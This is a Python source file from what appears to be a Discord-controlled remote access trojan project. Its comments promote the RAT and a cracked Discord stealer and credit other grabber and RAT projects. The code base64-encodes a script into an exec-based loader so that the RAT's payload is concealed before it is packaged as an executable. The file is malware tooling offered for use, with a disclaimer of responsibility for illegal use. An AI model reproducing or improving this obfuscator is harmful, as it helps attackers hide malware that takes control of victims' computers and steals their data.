import base64
import sys
import os

# This RAT is made by H-zz-H!  
# If you have any questions or need help, feel free to contact me on Discord: _h_zz_h_ or join my server: https://discord.gg/29Ya4F3CgQ.  
# On my Discord server (as of 23.02.2025), I have posted a cracked open-source Discord Stealer that would normally cost more than 120 euros for lifetime access.  
# Join my Discord server for coding help or if you encounter errors with this RAT. I am always open to new ideas, projects, or feature suggestions for this RAT.  
# If you want to add new features or improve this RAT, feel free to do so and share your work with me on Discord.  
# If I find the time, this RAT will be updated and working forever. If not, well, I don't know.  
# If you use this RAT for illegal purposes, I am not responsible for it. I am also not responsible for any damage caused by this RAT.  
# Skid from this project if you want, I don’t really care lol. Just don’t claim it as your own work.  

# Sources I skidded from:  
# https://github.com/Blank-c/Blank-Grabber (The !blocklist and !unblocklist commands are almost fully skidded. I just changed the code a bit to fit my project).  
# Tried doing it on my own (but I’m way too retarded for that).
# https://github.com/moom825/Discord-RAT (Because of this RAT, I started this project. So special thanks to moom825).  
# The !uncritproc and !critproc commands are from moom825's Discord-RAT project. Many features are quite the same as in moom825's project.  
# That’s because I needed some features I could code, and his GitHub page was full of ideas to implement.  
# Almost everything in this project is inspired by him.  

# Thanks for taking the time to read.  
# Love y’all. Bye.  
# ~~~ H-zz-H ~~~  

# This is the obfuscater script. It will obfuscate the RAT and create a new file with the obfuscated content. 
# After running use exe_generator.py to create an executable file.

def encode_file(input_file, output_file):
    if not os.path.isfile(input_file):
        print(f"Error: The file '{input_file}' does not exist.")
        sys.exit(1)

    with open(input_file, 'r', encoding='utf-8') as f:
        content = f.read()

    encoded_content = base64.b64encode(content.encode()).decode()

    obfuscated_script = f'''
import base64

encoded_content = "{encoded_content}"

exec(base64.b64decode(encoded_content).decode())
'''

    with open(output_file, 'w', encoding='utf-8') as f:
        f.write(obfuscated_script)
    
    print(f"Obfuscated file has been created: {output_file}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: py obfuscater.py input_file.py")
        sys.exit(1)

    input_file = os.path.abspath(sys.argv[1])
    output_file = f"obfuscated_{os.path.basename(input_file)}"

    encode_file(input_file, output_file)
